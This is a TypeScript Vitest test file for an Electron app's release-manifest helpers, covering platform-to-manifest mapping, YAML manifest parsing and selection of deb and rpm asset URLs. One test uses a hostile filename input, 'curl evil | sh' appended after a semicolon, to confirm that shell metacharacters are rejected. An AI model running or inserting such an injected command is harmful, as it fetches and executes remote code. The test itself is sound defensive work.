import { describe, expect, it } from 'vitest'
import {
  buildReleaseManifestUrl,
  deriveReleaseMetadata,
  manifestFilenameForHost,
  parseReleaseManifest,
  RELEASE_MANIFEST_BASE_URL,
  selectPackageAssetUrl
} from './runtime-release-manifest'

// Shape emitted by electron-builder for a Linux AppImage release: note the
// deb/rpm are NOT listed here, only the AppImage.
const LINUX_MANIFEST = `version: 1.4.2
files:
  - url: orca-linux.AppImage
    sha512: abc123==
    size: 123456789
path: orca-linux.AppImage
sha512: abc123==
releaseDate: '2026-07-01T00:00:00.000Z'
`

const MAC_MANIFEST = `version: 1.4.2
files:
  - url: orca-macos-arm64.zip
    sha512: def456==
    size: 987654321
    blockMapSize: 4242
path: orca-macos-arm64.zip
sha512: def456==
releaseDate: '2026-07-01T00:00:00.000Z'
`

describe('manifestFilenameForHost', () => {
  it('maps each platform/arch to the electron-updater manifest filename', () => {
    expect(manifestFilenameForHost('linux', 'x64')).toBe('latest-linux.yml')
    expect(manifestFilenameForHost('linux', 'arm64')).toBe('latest-linux-arm64.yml')
    // Arch unknown on Linux defaults to the x64 manifest, not a guess.
    expect(manifestFilenameForHost('linux', undefined)).toBe('latest-linux.yml')
    expect(manifestFilenameForHost('darwin', 'arm64')).toBe('latest-mac.yml')
    expect(manifestFilenameForHost('darwin', undefined)).toBe('latest-mac.yml')
    expect(manifestFilenameForHost('win32', 'x64')).toBe('latest.yml')
  })

  it('returns null for platforms with no published manifest', () => {
    expect(manifestFilenameForHost(undefined, undefined)).toBeNull()
    expect(manifestFilenameForHost('freebsd', 'x64')).toBeNull()
  })
})

describe('buildReleaseManifestUrl', () => {
  it('joins the client-owned base with the mapped filename', () => {
    expect(buildReleaseManifestUrl('linux', 'arm64')).toBe(
      `${RELEASE_MANIFEST_BASE_URL}/latest-linux-arm64.yml`
    )
  })

  it('returns null when there is no manifest for the platform', () => {
    expect(buildReleaseManifestUrl('aix', undefined)).toBeNull()
  })
})

describe('parseReleaseManifest', () => {
  it('extracts version and file urls from a linux manifest', () => {
    expect(parseReleaseManifest(LINUX_MANIFEST)).toEqual({
      version: '1.4.2',
      files: ['orca-linux.AppImage']
    })
  })

  it('extracts a quoted/prerelease version and mac zip asset', () => {
    const manifest = parseReleaseManifest(MAC_MANIFEST)
    expect(manifest?.version).toBe('1.4.2')
    expect(manifest?.files).toEqual(['orca-macos-arm64.zip'])
  })

  it('accepts prerelease semver and strips quotes', () => {
    expect(
      parseReleaseManifest(`version: "2.0.0-rc.3"\nfiles:\n  - url: a.AppImage\n`)?.version
    ).toBe('2.0.0-rc.3')
  })

  it('drops a malformed version but keeps the file list', () => {
    const manifest = parseReleaseManifest(
      `version: not-a-version\nfiles:\n  - url: orca-linux.AppImage\n`
    )
    expect(manifest?.version).toBeUndefined()
    expect(manifest?.files).toEqual(['orca-linux.AppImage'])
  })

  it('returns null for empty or contentless input', () => {
    expect(parseReleaseManifest('')).toBeNull()
    expect(parseReleaseManifest('releaseDate: 2026-07-01\n')).toBeNull()
    expect(parseReleaseManifest(123 as unknown as string)).toBeNull()
  })
})

describe('selectPackageAssetUrl', () => {
  it('returns undefined when the manifest lists only the AppImage (the real case)', () => {
    const manifest = parseReleaseManifest(LINUX_MANIFEST)
    expect(selectPackageAssetUrl(manifest?.files ?? [], 'linux-deb', 'x64')).toBeUndefined()
    expect(selectPackageAssetUrl(manifest?.files ?? [], 'linux-rpm', 'x64')).toBeUndefined()
  })

  it('selects the arch-matching deb when the manifest enumerates one', () => {
    const files = ['orca-ide_1.4.2_amd64.deb', 'orca-ide_1.4.2_arm64.deb', 'orca-linux.AppImage']
    expect(selectPackageAssetUrl(files, 'linux-deb', 'arm64')).toBe(
      `${RELEASE_MANIFEST_BASE_URL}/orca-ide_1.4.2_arm64.deb`
    )
    expect(selectPackageAssetUrl(files, 'linux-deb', 'x64')).toBe(
      `${RELEASE_MANIFEST_BASE_URL}/orca-ide_1.4.2_amd64.deb`
    )
  })

  it('selects the arch-matching rpm by its x86_64/aarch64 token', () => {
    const files = ['orca-ide-1.4.2.x86_64.rpm', 'orca-ide-1.4.2.aarch64.rpm']
    expect(selectPackageAssetUrl(files, 'linux-rpm', 'x64')).toBe(
      `${RELEASE_MANIFEST_BASE_URL}/orca-ide-1.4.2.x86_64.rpm`
    )
    expect(selectPackageAssetUrl(files, 'linux-rpm', 'arm64')).toBe(
      `${RELEASE_MANIFEST_BASE_URL}/orca-ide-1.4.2.aarch64.rpm`
    )
  })

  it('does not offer a mismatched-arch package', () => {
    expect(
      selectPackageAssetUrl(['orca-ide_1.4.2_amd64.deb'], 'linux-deb', 'arm64')
    ).toBeUndefined()
  })

  it('rejects a package filename carrying shell metacharacters', () => {
    expect(
      selectPackageAssetUrl(['orca-ide_1.4.2_amd64.deb; curl evil | sh'], 'linux-deb', 'x64')
    ).toBeUndefined()
  })

  it('returns undefined for non-package install kinds', () => {
    expect(
      selectPackageAssetUrl(['orca-ide_1.4.2_amd64.deb'], 'linux-appimage', 'x64')
    ).toBeUndefined()
    expect(selectPackageAssetUrl(['orca-ide_1.4.2_amd64.deb'], undefined, 'x64')).toBeUndefined()
  })
})

describe('deriveReleaseMetadata', () => {
  it('reports updateAvailable when both versions are known and differ', () => {
    const manifest = { version: '1.4.2', files: [] }
    expect(deriveReleaseMetadata({ manifest, currentVersion: '1.0.0' })).toEqual({
      latestVersion: '1.4.2',
      updateAvailable: true
    })
  })

  it('reports updateAvailable false when versions match', () => {
    const manifest = { version: '1.4.2', files: [] }
    expect(deriveReleaseMetadata({ manifest, currentVersion: '1.4.2' })).toEqual({
      latestVersion: '1.4.2',
      updateAvailable: false
    })
  })

  it('omits updateAvailable when the server version is unknown (cold-start)', () => {
    const manifest = { version: '1.4.2', files: [] }
    const metadata = deriveReleaseMetadata({ manifest })
    expect(metadata.latestVersion).toBe('1.4.2')
    expect(metadata.updateAvailable).toBeUndefined()
  })

  it('adds an asset URL only when a matching package is enumerated', () => {
    const withDeb = deriveReleaseMetadata({
      manifest: { version: '1.4.2', files: ['orca-ide_1.4.2_amd64.deb'] },
      currentVersion: '1.0.0',
      installKind: 'linux-deb',
      arch: 'x64'
    })
    expect(withDeb.assetUrl).toBe(`${RELEASE_MANIFEST_BASE_URL}/orca-ide_1.4.2_amd64.deb`)

    const appImageOnly = deriveReleaseMetadata({
      manifest: parseReleaseManifest(LINUX_MANIFEST) ?? { files: [] },
      currentVersion: '1.0.0',
      installKind: 'linux-deb',
      arch: 'x64'
    })
    expect(appImageOnly.assetUrl).toBeUndefined()
  })
})
